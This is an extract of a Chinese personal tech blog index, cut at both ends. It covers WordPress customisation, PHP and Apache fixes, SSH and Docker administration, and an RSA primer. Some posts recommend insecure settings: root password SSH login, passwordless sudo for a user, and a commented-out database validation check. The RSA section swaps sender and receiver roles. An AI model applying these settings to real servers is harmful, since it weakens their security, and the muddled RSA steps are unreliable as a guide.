Uncaught Error: Call to undefined function openssl_sign()\n```\n\n要使用这个函数必须在PHP中开启openssl模块，很多网上的博客大多会提到这样一种方法：在php.ini文件中增加一句`extension=php_openssl.dll`。\n\n\n加了这句代码后，运行时仍报了一个warning：\n\n```plaintext\nPHP Warning:  PHP Startup: Unable to load dynamic library 'php_openssl.dll'\n```\n\n后来研究发现在php.ini中有一行代码描述了PHP扩展所在路径：`extension_dir = \"${phphome}\\ext\"`，而变量`${phphome}`在我这儿并没有定义，这一点很多其他博客并没有提到，这应该是一个环境变量，不过我之前没有设置过，因此我在前面加了一句：`phphome='e:\\php-7.3.22'`，为我的PHP安装目录，问题解决。\n","tags":["PHP"],"categories":["Debug"]},{"title":"WordPress接入微博登录","url":"//blog/5026/","content":"\n现在不少WordPress站点都接入了第三方登录，第三方登录不仅安全性高，还降低了注册成本、提高了注册效率，有助于吸引更多用户。\n\n微博作为中国最大的网络平台之一，有着庞大的用户人群，本文将提供WP网站接入微博登录的方法。\n\n首先源代码来源于此仓库：\n\n{%link wp-oauth,GitHub,https://github.com/bigfa/wp-oauth %}\n\n这位大佬还提供了很多其他平台的第三方接入教程。由于这位大佬写的不是很详细，因此我在这给出一个菜鸟教程，同时在代码中补充了CSRF验证，其他方面也有少量修改。\n\n\n经过我修改后的微博登录代码可以从[这个gist](https://gist.github.com/windshadow233/ba0514191284fc9b25c444c04eb36d70)拿。\n\n\n第一步，请确保你拥有一个[微博开放平台](https://open.weibo.com/)审核通过的网站应用，将其App Key与App Secret复制到文件开头的代码中：\n\n```php\ndefine('WB_APPID','your_appkey');//appkey\ndefine('WB_APPSECRET','your_appsecret');//appsecret\n```\n\n第二步，在网站根目录下创建一个名为oauth的文件夹，将`weibo.php`文件传到该文件夹下（路径或文件名都可以随便改，只要你会修改文件内的一些配置就行，但如果按我这么做，就不需要修改任何其他配置）\n\n\n第三步，在微博开放平台中设置该应用的授权回调页以及取消授权回调页，所谓授权回调页其实就是你网站下`weibo.php`文件的地址，若按第二步的做法，该授权回调页应该设为`http(s)://域名/auth/weibo.php`；取消授权回调页我设为了网站首页，应该只要和授权回调页不相同就行。另外应用的服务IP地址不清楚是否必要，我个人直接填了一下服务器IP，没有去做其他尝试。\n\n\n第四步，在你的网站插入一个微博登录的超链接，href设为`http(s)://域名/oauth/weibo.php?rurl`，点击该链接，即可授权微信登录！\n","tags":["WordPress","PHP","Oauth"],"categories":["博客相关"]},{"title":"WordPress记录、显示文章阅读次数","url":"//blog/4968/","content":"\n在使用WP建站时，我们可能会需要知道文章的受欢迎程度，其可以体现于其他人阅读文章的次数。今天我就提供一种简单的用以给文章浏览量进行计数的功能。\n\n思路是在head部分加载的过程中执行一个计数+1的动作，将计数存入数据库的`wp_postmeta`表。在需要时将表中对应数据读出来即可。\n\n\n将以下代码加入`functions.php`：\n\n```php\nfunction post_views(){\n\tglobal $post;\n\t$post_ID = $post->ID;  \n\t$views = (int)get_post_meta($post_ID, 'visitors', true);\n\treturn '阅读（' .$views .'）';\n}\nfunction record_visitors()  \n{ \n\t$currentUser = wp_get_current_user();\n\tif(empty($currentUser->roles) || !in_array('administrator', $currentUser->roles)) \n\t\tif (is_single()||is_page()) { \n\t\t\tglobal $post;\n\t\t\t$post_ID = $post->ID;\n\t\t\tif($post_ID) {  \n\t\t\t\t$post_views = (int)get_post_meta($post_ID, 'visitors', true);  \n\t\t\t\tif(!update_post_meta($post_ID, 'visitors', ($post_views+1))) {  \n\t\t\t\t\tadd_post_meta($post_ID, 'visitors', 1, true); \n\t\t\t\t}  \n\t\t\t}  \n\t}  \n}\nadd_action('wp_head', 'record_visitors');\n```\n\n在需要调用本页阅读次数的地方插入以下代码：\n\n```php\n<?php echo post_views(); ?>\n```","tags":["WordPress","PHP","Web后端"],"categories":["博客相关"]},{"title":"WordPress小工具标签云参数自定义","url":"//blog/4966/","content":"\nWP小工具有一个自带的标签云功能，可以为访客提供站点常用的关键词列表，便于访客在站内进行搜索。\n\n标签云的生成函数`wp_tag_cloud`位于`/wp-includes/category-template.php`文件中，提供的参数数组如下：\n\n```php\n$defaults = array(\n\t\t'smallest'   => 8,\n\t\t'largest'    => 22,\n\t\t'unit'       => 'pt',\n\t\t'number'     => 45,\n\t\t'format'     => 'flat',\n\t\t'separator'  => \"\\n\",\n\t\t'orderby'    => 'count',\n\t\t'order'      => 'DESC',\n\t\t'exclude'    => '',\n\t\t'include'    => '',\n\t\t'link'       => 'view',\n\t\t'taxonomy'   => 'post_tag',\n\t\t'post_type'  => '',\n\t\t'echo'       => true,\n\t\t'show_count' => 0,\n\t);\n```\n\n另外小工具中为标签云提供了一个参数解析过滤器`widget_tag_cloud_args`，这个过滤器可以直接修改小工具中标签云的参数，将以下代码插入`functions.php`，就可以对小工具中的标签云参数进行修改。\n\n```php\n//小工具标签云\nfunction my_tag_cloud_args( $args ){\n\t$new_args = array(\n\t\t'number'     => 20,\n\t\t'order'      => 'RAND',\n\t);\n\t$args = array_merge( $args, $new_args );\n\treturn $args;\n}\nadd_filter('widget_tag_cloud_args', 'my_tag_cloud_args');\n```\n\n其中在`$new_args`数组中填入新的参数即可。\n","tags":["WordPress","PHP","Web后端"],"categories":["博客相关"]},{"title":"在网页底部添加动态运行时间","url":"//blog/4962/","content":"\n很多人都在各种博客网站底部看到过动态变化的运行时间，比如“本站点已运行100天21小时56分17秒”，那么要想添加这样一行内容其实非常简单，只要用到基础的JS。\n\n在网站底部添加以下代码即可：\n\n```markup\n<span id=\"runtime\"></span>\n<script>function show_runtime(){window.setTimeout(\"show_runtime()\",1000);X=new Date(\"6/29/2020 18:14:10\");Y=new Date();T=(Y.getTime()-X.getTime());M=24*60*60*1000;a=T/M;A=Math.floor(a);b=(a-A)*24;B=Math.floor(b);c=(b-B)*60;C=Math.floor((b-B)*60);D=Math.floor((c-C)*60);runtime.innerHTML=\"运行时间：\"+A+\"天\"+B+\"小时\"+C+\"分\"+D+\"秒\"}show_runtime();</script>\n```","tags":["JavaScript","Web前端"],"categories":["博客相关"]},{"title":"WordPress不支持中文用户名注册的解决方法","url":"//blog/4932/","content":"\nWP默认是不支持中文用户名的，但身为中国人这岂能忍，本文带给大家一种方法，让WP支持中文用户名注册。\n\n\nWP对注册用户名的限制写在`/wp-includes/formatting.php`文件中，对应函数是`sanitize_user`，其中限制中文的原因来自下面代码：\n\n\n```php\nif ( $strict ) {\n\t\t$username = preg_replace( '|[^a-z0-9 _.\\-@]|i', '', $username );\n\t}\n```\n\n在`$strict=true`时该语句将所有的非ASCII字符全过滤掉了。解决方法如下：\n\n\n在functions.php文件中加入以下回调函数进行过滤：\n\n```php\n// 支持中文用户名注册\nfunction zh_sanitize_user ($username, $raw_username, $strict) {\n\n\t$username = wp_strip_all_tags( $raw_username );\n\t$username = remove_accents( $username );\n\t\n\t$username = preg_replace( '|%([a-fA-F0-9][a-fA-F0-9])|', '', $username );\n\t$username = preg_replace( '/&.+?;/', '', $username );\n\n\tif ($strict) {\n\t\t$username = preg_replace ('|[^a-z\\p{Han}0-9 _.\\-@]|iu', '', $username);\n\t}\n\n\t$username = trim( $username );\n\t$username = preg_replace( '|\\s+|', ' ', $username );\n\n\treturn $username;\n}\nadd_filter('sanitize_user', 'zh_sanitize_user', 10, 3);\n```\n\n接下来就可以用中文进行注册啦~另外还有一个问题是中文用户名有长度不超过5的限制，对于该问题，我经过研究发现是php对utf-8字符的长度判断函数有一点问题，具体出问题的代码发生在`/wp-includes/wp-db.php`文件，问题出在`strip_invalid_text`函数，问题的根本原因是其将中文进行了URL编码且当成普通的ACSII字符来计算长度了，我这里直接将大约2430行处的以下代码进行了注释：\n\n```php\n$converted_data = $this->strip_invalid_text( $data );\n\nif ( $data !== $converted_data ) {\n\treturn false;\n}\n```\n\n这样做可能有一定的风险，应该还有更好的方法。\n","tags":["WordPress","PHP"],"categories":["Debug","博客相关"]},{"title":"Windows系统修复图标显示问题","url":"//blog/4718/","content":"\n相信不少人都遇到过软件图标突然显示不了的问题，对于这种奇葩情况，我们可以用下面方法进行修复：\n\n\n新建一个文本文档，内容是以下代码：\n\n\n```bat\ntaskkill /f /im explorer.exe\n\nattrib -h -i %userprofile%\\AppData\\Local\\IconCache.db\n\ndel %userprofile%\\AppData\\Local\\IconCache.db /a\n\nstart explorer\n```\n\n保存为.bat文件，双击运行即可解决问题。\n","tags":["Windows"],"categories":["Debug"]},{"title":"服务器SSH配置出错导致无法连接问题的解决","url":"//blog/4520/","content":"\n有时候在操作服务器的过程中，一不小心（或有意）动了SSH的配置文件，导致其崩溃，关闭连接后无法再一次连接。就这个问题，本文从我个人的经验来写一些解决方法。\n\n1. 傻瓜式方法，一般提供服务器的厂商都会提供一键重装系统的功能，如果没什么重要数据，重装系统可以解决100%的问题。\n2. 如果有备份，也可以直接恢复备份。\n3. 提供服务器的厂商一般会提供紧急救援连接，比如阿里云，我们可以通过救援连接登录服务器，然后修改配置文件，若不会修改配置文件或是因为其他配置问题导致的崩溃，直接重装SSH也是可以的，以下是操作过程：\n\n\n```bash\nsudo apt-get remove openssh-server  openssh-client --purge -y\nsudo apt-get autoremove\nsudo apt-get autoclean\nsudo apt-get install openssh-server openssh-client\n```\n\n安装完成以后，简单修改一下配置文件：\n\n```bash\nsudo vi /etc/ssh/sshd_config\n```\n\n添加root密码登录的配置：\n\n```raw\nPermitRootLogin yes\nPasswordAuthentication yes\n```\n\n保存退出，然后重启服务：\n\n```bash\nsudo systemctl restart sshd.service\n```\n\n问题解决！\n","tags":["Linux","SSH"],"categories":["Debug"]},{"title":"一句命令部署WordPress","url":"//blog/4518/","content":"\n写了许多WordPress相关的文章，但迟迟没有写部署的方法，目前比较简单的部署方法有宝塔面板一键部署或直接使用WordPress应用镜像。\n\n而考虑到宝塔面板需要额外预留大约0.5G内存且最近刚出来一个非常严重的数据库安全漏洞（无法预知以后还会不会有）；直接装WordPress应用镜像过于无脑。因此我在这里介绍一条被很多人忽略的部署方法——使用docker。\n\n\n关于docker软件的安装及容器的部署过程，我已经在[ShareLaTeX部署](/blog/186/)中提过一次了，这里不再做特别详细的介绍。\n\n\nWordPress容器的配置文件可以参考下面内容，并根据需求自行修改配置文件：\n\n```yaml\nversion: '3.1'\n\nservices:\n    WordPress:\n        image: WordPress\n        restart: always\n        ports: \n            - 80:80\n        environment:\n            WordPress_DB_HOST: db\n            WordPress_DB_USER: root\n            WordPress_DB_PASSWORD: *******\n            WordPress_DB_NAME: WordPress_db\n        volumes:\n            - ./www/html:/var/www/html\n    db:\n        image: mysql:8.0\n        restart: always\n        environment:\n            MYSQL_DATABASE: WordPress_db\n            MYSQL_ROOT_PASSWORD: *******\n        volumes:\n            - ./mysql:/var/lib/mysql\n```\n\n\n将该文件写入`docker-compose.yml`，并放置在一个目录下，然后在该目录下执行命令：\n\n```bash\ndocker-compose up -d\n```\n\n稍等片刻，就可以在浏览器中进入WordPress设置页面了！\n\n\n若访问不了网站请检查服务器端口有没有打开。\n","tags":["Docker","Linux","WordPress"],"categories":["博客相关"]},{"title":"WordPress主题二次开发——子主题","url":"//blog/4370/","content":"\n在WP开发过程中，直接修改主题文件对主题进行美化是不妥的，因为若主题升级，一切又得重来，而子主题可以完美解决这一问题。子主题是指一个继承了另一个主题——父主题全部功能样式的主题，同时它允许你自己添加一些功能与样式。\n\n创建一个子主题比较容易：\n\n\n首先进入themes文件夹，该文件夹下放置了你全部的主题，找一个你希望继承的父主题文件夹，这里假设名为theme-parent，接下来创建子主题只需要两个步骤：\n\n\n- 在themes文件夹下创建一个新文件夹，命名为theme-child（表示子主题的文件夹名，可任意命名）\n- 进入子主题文件夹，创建一个文件：`style.css`，内容如下：\n\n\n```css\n/*!\nTheme name:Theme-Child\nTemplate:theme-parent\n*/\n@import url('../theme-parent/style.css')\n```\n\nTheme name后面内容是你的子主题名称，Template后面填写父主题文件夹名，下面的url修改成父主题下的style.css的相对路径。\n\n\n此时子主题已经制作完成，它和父主题一毛一样，因为我们没有加任何新的内容。若想加入新的函数，只需在子主题文件夹下创建一个functions.php文件，里面写入函数即可。\n\n\n返回子主题文件路径的函数：`get_stylesheet_directory()`\n\n\n返回子主题URI的函数：`get_stylesheet_directory_uri('template_url')`\n","tags":["WordPress"],"categories":["博客相关"]},{"title":"Apache字体文件跨域问题","url":"//blog/4251/","content":"\n开启cdn加速后，我在浏览器中遇到了数十条类似下面的报错：\n\n\n```raw\n...has been blocked by CORS policy: No 'Access-Control-Allow-Origin'...\n```\n\n就是个CORS跨域问题，这里出问题的文件基本都是一些诸如ttf、otf什么的字体文件。相信各位都比较清楚跨域是啥、什么时候会产生跨域，这里不再多说。要解决这个问题也非常容易，这里针对apache（apache2）进行说明，nginx也类似。\n\n\n首先登录apache2所在的服务器，跑一句命令：\n\n```bash\na2enmod headers\n```\n\n开启mod_headers模块，然后重新加载配置：\n\n```bash\n/etc/init.d/apache2 force-reload\n```\n\n接下来打开站点的配置文件（.htaccess文件）\n\n\n写入下面一段代码保存即可：\n\n```apache\n<FilesMatch \"\\.(ttf|otf|eot|woff|woff2|)(.*)\">\n        <IfModule mod_headers.c>\n                Header set Access-Control-Allow-Origin \"*\"\n        </IfModule>\n</FilesMatch>\n```\n\n也可以将第三行的 \\* 换成源站完整的地址。\n","tags":["Apache","CORS"],"categories":["Debug"]},{"title":"WordPress配置CDN加速","url":"//blog/4247/","content":"\nCDN（内容分发网络）可以根据用户的位置就近获取网站静态资源，降低网络的拥塞、减轻服务器压力。\n\n![](https://oss.fyz666.xyz/blogfiles/webp/eaedcc3ba85fbd72e6116c5971eb2a6d.webp)这里我选择的平台依旧是阿里云，进入阿里云的控制台，找到CDN→域名管理→添加域名。（若想配置DCDN，前往阿里云DCDN控制台进行下面类似的操作即可。）\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d4e54e2959514a6494694bf1df40f92b.png)\n\n以cdn.fyz666.xyz为例，按上图进行配置以后，域名管理栏中就出现了你刚刚设置的加速域名，接下来根据需求需要进行DNS解析即可。\n\n\n稍等片刻，解析记录就生效了。接下来就可以前往WordPress修改静态资源链接了。但一个一个修改实在是累，而且万一哪天不用cdn了还得改回来，就很麻烦，这里推荐一款WP插件：CDN Enabler\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/fc7455b7fbbde09f450b8e42de2eafd7.png)\n\n至此全站加速基本配置完了，还有一些小bug需要处理，例如字体文件被CORS跨域阻止。解决方法[戳这里](/blog/4251/)。\n","tags":["WordPress","CDN"],"categories":["博客相关"]},{"title":"使用密钥登录SSH","url":"//blog/4227/","content":"\n由于使用密码登录ssh相对而言安全性差一点（而且每次都输密码太麻烦了），我们可以使用密钥进行ssh连接。\n\n先在本地生成一对rsa密钥：\n\n```bash\nssh-keygen -t rsa -m PEM -b 3072\n```\n\n随后一路回车即可。\n\n\n接下来进入用户目录`C://Users/用户名/`，可以发现已经生成了一个`.ssh`文件夹。里面包含`id_rsa`和`id_rsa.pub`两个文件，其中后者是公钥文件。将公钥文件`id_rsa.pub`上传到服务器需要密钥登录的用户名文件夹的`.ssh`目录下（如果没有`.ssh`目录就自己创建一个），并将公钥文件重命名为`authorized_keys`，例如`/home/user1/.ssh/authorized_keys`。\n\n\n现在在本地进行ssh连接：`ssh user1@ip` 已经默认使用密钥了。\n\n\n接下来需要禁止该用户使用密码登录：\n\n\n登录服务器修改`/etc/ssh/sshd_config`文件：\n\n```bash\nsudo vi /etc/ssh/sshd_config\n```\n\n添加下面内容（user1是禁用密码登录的用户名）：\n\n```raw\nMatch user user1\n        PasswordAuthentication no\n```\n\n\n```bash\n# 重启sshd服务\nsudo systemctl restart sshd.service\n```","tags":["Linux","SSH"],"categories":["瞎捣鼓经历"]},{"title":"Linux系统禁止root用户SSH登录","url":"//blog/4211/","content":"\nRoot用户在linux系统中拥有至高无上的权力与地位，可以做任何你想做的事，因此若一旦被不怀好意的人暴力破解root用户的密码，服务器就会陷入危险境地。\n\n（我的服务器：这么看得起我？？？）咳咳，虽然我的服务器不值得被其他人暴破，但流程还是要走一下的。阿里云的Linux服务器自带了一个可以在控制台无密码登录的admin用户，因此只要禁止root登录SSH即可。而我不太喜欢阿里云的远程连接界面，故又创了一个新用户。\n\n\n禁止root用户登录的操作：\n\n```bash\n# 打开以下文件\nsudo vi /etc/ssh/sshd_config\n```\n\n{% tabs tab1 %}\n\n<!-- tab 方法一 -->\n\n```raw\n# 翻到文件最下面将这一项修改为no\nPermitRootLogin no\n```\n\n\n```bash\n# 重启sshd\nsudo systemctl restart sshd.service\n```\n\n但这种方法过于简单粗暴，也直接限制了root的sftp登录，如果想让root用户仍可以登录sftp，则可以使用方法二。\n\n<!-- endtab -->\n\n<!-- tab 方法二 -->\n\n```raw\n# 这一项不修改\nPermitRootLogin yes\n# 添加下面两行\nMatch user root\n        ForceCommand internal-sftp\n```\n\n\n```bash\n# 重启sshd\nsudo systemctl restart sshd.service\n```\n\n\n以下操作用于新建用户：\n\n```bash\n# 新建一个用户（命名为user1）\nsudo adduser user1\n# 为其设置密码\nsudo passwd user1\n```\n\n设置密码以后，便可以用该用户登录ssh，然后使用`sudo su`来切换root用户，唯一的缺点就是需要再输一遍密码，以下操作可以避免之：\n\n```bash\n# 使用visudo命令打开sudoers文件\nsudo visudo /etc/sudoers\n```\n\n\n```raw\n# 添加一行\nuser1    ALL=(ALL)  NOPASSWD:ALL\n```\n\n<!-- endtab -->\n\n{%endtabs%}","tags":["Linux","SSH"],"categories":["瞎捣鼓经历"]},{"title":"WordPress登录提示Cookies被阻止的解决办法","url":"//blog/4160/","content":"\n有一天，我正常在前台登录窗口输入自己的账号密码，却得到了一个登录失败的提示，F12查看Network之后发现报错内容如下：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/097ff0a8f20093b3b4cf90fd6469cea9.png)\n我根本没当回事，轻车熟路打开浏览器设置页面找到cookie设置，却发现根本没有阻止网页的cookie。\n\n\n查遍资料，大多解决办法都是在wp-config.php文件中加一句诸如这样的代码：`define('COOKIE_DOMAIN', $_SERVER['HTTP_HOST'] );`\n\n\n但这并没能解决我的问题，后来经过研究我发现原来是WP自带的登录功能会先判断浏览器是否支持cookie，若支持则添加一个cookie，该cookie存在时尚能正常进行登录。这个cookie长这样：\n\n![](https://oss.fyz666.xyz/blogfiles/png/a3dcbdb5e3589533df8495a04243b3c9.png)\n于是我在登录函数里加了一段js代码来判断浏览器是否支持cookie，若支持则添加上面的cookie：\n\n```js\nif (!navigator.cookieEnabled){\n\t\talert('浏览器未支持cookie，请更换浏览器或解除对本站cookie的阻止');\n\t\treturn;\n\t}\n\tif ($.cookie('WordPress_test_cookie') != \"WP+Cookie+check\") {\n\t\t$.cookie('WordPress_test_cookie', 'WP+Cookie+check', { expires: 365 , path: '/'});\n\t}\n```\n\n从而解决了这个问题。\n\n此方法需要导入`jquery.cookie.js`文件：\n\n{%link jquery-cookie,GitHub,https://github.com/carhartl/jquery-cookie/ %}\n","tags":["WordPress","Cookie"],"categories":["Debug","博客相关"]},{"title":"Docker for Windows磁盘映像文件迁移","url":"//blog/3924/","content":"\n最近在windows 10系统上安装了docker，随手pull了几个镜像后，发现C盘空间锐减（少了1-2个G），心想其默认镜像存储空间铁定在C盘了，故得想办法将其揪出来，并修改一下默认路径。\n\n查了好多资料，基本都表示windows版的docker是基于hyper-v虚拟机运行的，需要去修改hyper-v虚拟机的一个虚拟磁盘路径，但我找了一下发现我甚至连hyper-v虚拟机都没有创建。。。那是怎么运行起来docker的呢？\n\n\n后来了解到我的docker版本是2.3.0.4，这一版本已经不依赖于hyper-v了，而采用了WSL 2这种我没听说过的东西。\n\n\n用TreeSizeFree软件扫描了一下C盘之后在AppData下面找到了一个很大的Docker文件夹，文件夹内部文件结构大概是：`Docker/wsl/data/ext4.vhdx`。\n\n\n这个ext4.vhdx就是一个磁盘映像文件，非常大。下面是将其转移的操作步骤：\n\n\n1. 停止docker\n2. 关闭WSL：`wsl --shutdown`\n3. 导出数据到随便哪个盘：`wsl --export docker-desktop-data F:\\docker-desktop-data.tar`\n4. 注销docker-desktop-data：`wsl --unregister docker-desktop-data`\n5. 转移数据到你想要的位置：`wsl --import docker-desktop-data F:\\docker\\wsl\\docker-desktop-data\\ F:\\docker-desktop-data.tar --version 2`\n","tags":["Docker","WSL"],"categories":["瞎捣鼓经历"]},{"title":"WordPress媒体库图片不显示问题的解决","url":"//blog/3847/","content":"\n先写一个相关的小插曲，今天上午起床后打开博客，发现导航菜单炸了：所有一级、二级菜单都变成了没有url的自定义链接，有些菜单的导航标签也消失了。\n\n这个问题虽然令我诧异（WP群里的大佬们也都表示没见过这个问题，一度怀疑是主题bug），但好在十分容易解决，删除菜单重新添加一个就行了，我也没多想。\n\n\n后来我打开媒体库，发现所有媒体图片都无法显示，而显示成一张默认图片：\n\n![](https://oss.fyz666.xyz/blogfiles/png/2db6a9e6cd49d2429668ce40e0dee762.png)\n不过原图片并没有删掉，通过图片链接访问完全没有问题。\n\n\n突然想起昨天搞了一下数据库，会不会是这个原因呢，我一通仔细排查果然发现了端倪。\n\n\n昨天在优化数据库时，看了[这篇文章](http://www.lanyingblog.com/blog/1095.html)\n\n\n该文章表示`wp_postmeta`这张表可有可无，我就随手清空了一下，却不想这一清空后果相当严重，不仅导致导航菜单直接乱套，所有链接都没了，还导致媒体库图片的数据全部无法显示。经过很长时间的排查才发现是因为清了这张表，这张表一定不能乱清空！！！得谨慎啊。\n\n\n找到问题以后，感觉基本没啥快捷的恢复方法了，因此我选择直接恢复服务器三天前的快照，不然重新传图片实在是太麻烦了。\n\n最后，学到的教训：\n\n- 对于自己不了解的操作，一定要谨慎操作！！！\n- 操作数据库前，一定要备份！！！\n","tags":["数据库","WordPress"],"categories":["Debug","博客相关"]},{"title":"RSA加密算法原理（二）","url":"//blog/3839/","content":"\n在[RSA加密算法原理（一）](/blog/3837/)一文中我科普了一些简单的数论基础知识，接下来可以细说RSA的数学原理啦~\n\n先以一个例子简单讲一下RSA算法的流程，假设A要向B发消息，那么B会按以下流程生成一对密钥：\n\n\n### 生成一对密钥（公私钥）\n\n\n- 选择两个不相等的质数$p和q$，例如$p=31,q=37$\n- 计算$n=p\\times q=31\\times37=1147$\n- 计算$\\phi(n)$，这里有一个比较直观的看法：由于$n$是两个质数$p,q$的乘积，那么小于$n$的正整数中，与$n$不互质的应该有\n\n$$\\begin{aligned}&kq,k= 1,2,...,p-1\\\\&kp,k= 1,2,...,q-1\\end{aligned}$$\n\n且$p、q$均为质数可以保证这些数两两不同，因此\n\n$$\\begin{aligned}\\phi(n)&=n-1-(p-1)-(q-1)\\\\&=n-p-q+1\\\\&=(p-1)(q-1)\\\\&=30\\times36=1080\\end{aligned}$$\n\n- 在$(1, \\phi(n))$之间随机选择一个正整数$e$，使得$e ⊥ \\phi(n)$，这里我们随便选一个$e=67$\n- 接下来，我们要找$e$在$\\mathbb{Z}_{\\phi(n)}$群中的乘法逆元正整数$d$，回顾[RSA加密算法原理（一）](/blog/3837/)中所写，$d$要满足：$$ed\\equiv 1 (mod\\ \\phi(n))$$由于$e与\\phi(n)$互质，这样的$d$一定是存在的，这里我们找出一个$d=403$，可自行代入验证看看对不对。\n- 现在，我们称二元组$(n,e)$是本次加密的公钥，称$d$是本次加密的私钥。因此本例中公钥是$(1147, 67)$，私钥是403。\n\n得到公私钥后，B将公钥发送给A，A将自己的信息按以下流程加密：\n\n\n### 加密过程\n\n\n- 假设A发送的信息转换为数字以后为$m$，且需要保证$m<n$，这里假设$m=1024$\n- 计算得到密文\n\n$$\\begin{aligned}c&=m^e\\ mod\\ n\\\\&=1024^{67}\\ mod\\ 1147\\\\&=280\\end{aligned}$$\n\nB得到的密文为280，他将其发送给A。\n\n\n### 解密过程\n\n\n现在A拿到了密文$c=280$，同时A手中还握有私钥$d=403$，另外A当然知道$n$的值，因此A可以按以下方法进行解密（$m<n$也可以从解密过程看出来）：\n\n\n$$\\begin{aligned}m&=c^d\\ mod\\ n\\\\&=280^{403}\\ mod\\ 1147\\\\&=1024\\end{aligned}$$\n\n\n还真的得到了明文，但这是巧合吗？当然不是，且看：\n\n\n#### 解密过程证明\n\n\n首先我们有$m^e\\equiv c(mod\\ n)$，这意味着$c=kn+m^e$，那么$$c^d=(kn+m^e)^d\\equiv m^{ed}(mod\\ n)$$这是由于二项式展开项中，只有$kn^0\\times m^{ed}$不能被$n$整除，其余所有项都含有$n$的次幂。\n\n\n接下来我们只要证明$$m^{ed}\\equiv m(mod\\ n)$$\n\n\n回顾$ed=k\\phi(n)+1$，代入之后我们需要证明的变成了$m^{k\\phi(n)+1}\\equiv m(mod\\ n)$\n\n\n接下来分为两类讨论：\n\n\n1. $m,n$互质，此时由欧拉定理，$m^{\\phi(n)}\\equiv 1(mod\\ n)$，因此$m^{\\phi(n)}=tn+1$，故\n$$\\begin{aligned}m^{k\\phi(n)+1}&=m(tn+1)^k\\\\ &\\equiv m\\times (tn)^0\\times 1^k\\\\&=m(mod\\ n)\\end{aligned}$$\n2. $m,n$不互质，此时必定有$m=kp$或$m=kq$，WLOG，我们只考虑$m=kp$情形，此时必有$m ⊥ q$，因此\n\n$$m^{\\phi(q)}=(kp)^{q-1}\\equiv 1(mod\\ q)$$\n\n与前面证明类似，可以得到\n\n$$[(kp)^{q-1}]^{h(p-1)}\\times (kp)=(kp)^{h(p-1)(q-1)+1}\\equiv kp(mod\\ q)$$\n\n回过头来，我们有$ed\\equiv 1(mod\\ \\phi(n))$，即$ed=h(p-1)(q-1)+1$，此时我们让前面式子里的$h$取为这里的$h$，然后将$ed$代入，就有\n\n$$(kp)^{ed}\\equiv kp(mod\\ q)$$\n\n那么$(kp)^{ed}=kp+tq$，左侧为$p$的倍数，那么右侧的$t$必然也是$p$的倍数，设为$t=rp$，于是$(kp)^{ed}=kp+rpq$，这也即$m^{ed}=m+rn$，显然$$m^{ed}\\equiv m(mod\\ n)$$\n\n\n故对所有的情形均证明了该解密过程确实可以得到明文。\n\n\n接下来我们来讨论该算法是否安全。\n\n\n### 在获取公钥(n,e)的情况下如何才能破解密文？\n\n\n以下列举一种想破解密文的常规思路。\n\n\n1. 要想破解密文，首先得得到密钥$d$\n2. $d$是$e$在$\\phi(n)$乘群中的逆元，要想得到$d$，必须得到$\\phi(n)$\n3. $\\phi(n)=(p-1)(q-1)$，要想得到$\\phi(n)$，必须得到$p,q$\n4. $p,q$是$n$的素因子，要想得到$p,q$，必须分解$n$\n\n由此我们发现，在获取公钥的情况下，常规思路破解密文的难度等同于对$n$进行素因子分解。我们当然可以轻松算出$1147=31\\times 37$，但当$n$是一个上千位数的时候，分解它目前而言是一件不太可能的事。以下内容来自维基百科。\n\n\n\n> 对极大整数做因数分解的难度决定了 RSA 算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法，那么 RSA 的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的 RSA 密钥才可能被暴力破解。到 2008 年为止，世界上还没有任何可靠的攻击 RSA 算法的方式。只要密钥长度足够长，用 RSA 加密的信息实际上是不能被解破的。\n> \n> \n> 维基百科：RSA\n\n\n在重要场合进行使用时，一般会取$n$为成百上千位的长整数，$e$一般取65537。\n","tags":["RSA","密码学","数论"],"categories":["学习笔记"]},{"title":"RSA加密算法原理（一）","url":"//blog/3837/","content":"\n密码学是计算机科学中与数学关系比较密切的领域，而当今最重要最流行的加密方式当属RSA加密，其应用领域非常广泛，从银行卡密码的加密到WEB数字签名等等都有其用武之地。本文将简单讲述这方面的历史与数学背景。\n\n## 相关历史\n\n\n历史上，有一种加密模式曾非常流行，即对称加密。（当然目前对称加密仍是一种重要的加密方法被应用于许多加密数据量较大的场景）\n\n\n所谓“对称加密”，也就是指下面这个过程：\n\n\n1. A与B约定一种加密规则\n2. A将信息加密，将密文发给B\n3. B应用约定的规则，对密文直接解密得到明文\n\n这里约定的规则被称为“密钥”，这种加密方式有它的优势，即加密速度快。但劣势也很显著：“密钥”需要在联络者之间进行传递，这也造成了不安全的因素，第三方若拦截了密钥，也就破译了信息。因此顺应历史潮流，1976年，一种新的加密理念诞生了：\n\n\n1. 先由B生成两把密钥，分别是公钥和私钥，公钥，如其名，是公开的，任何人都可以获取；而私钥则由B进行保管。\n2. B将公钥发送给A，A将信息用公钥进行加密，将密文发送给B。\n3. B用私钥将密文进行解密得到明文。\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/04736da967a7ae989922ae713842dfb5.jpg)\n\n随意从百度拿了个图\n\n\n这也被称为“非对称加密”。\n\n\n当然，一个思维正常的人肯定会发问：既然密文是由公钥加密得到的，那为什么不能反过来用公钥对密文解密？\n\n\n这确实是一件值得研究的事，如何设计一种算法来使公钥可以对信息进行加密但却无法解密呢？（“非对称”三字正是体现在这一点上）\n\n\n在非对称加密这种理念提出的第二年，也即1977年，有三位数学家Ron Rivest、Adi Shamir 和 Leonard Adleman设计了一种算法，可以实现非对称加密，并将这种算法以他们三个人的名字命名，叫做RSA算法，这种算法目前为止被认为无解（或在不知道私钥的情况下破解时间超过可承受限度）。以下将从数学角度讲解该算法的原理。\n\n\n## 数论基础\n\n\n该算法涉及到一点基本数论知识，先简单提一下。\n\n\n### 互质\n\n\n互质是指两个正整数的一种关系，若两个正整数a和b除1外没有共同的因子，则称a和b有互质的关系，也记为$a ⊥ b$。例如：25和15有非1的公因子5，因此它们不互质；16和7没有除1以外的公因子，因此它们互质。\n\n\n### 欧拉函数\n\n\n定义欧拉函数$\\phi(n)为小于n$的正整数当中，与$n$互质的数的个数。\n\n\n例如，因为在1-9中，与10互质的数有：1,3,7,9这四个，因此$\\phi(10)=4$。\n\n\n### 乘法逆元\n\n\n若正整数$a与b$关于正整数n满足以下条件：$$ab\\equiv 1 (mod\\ 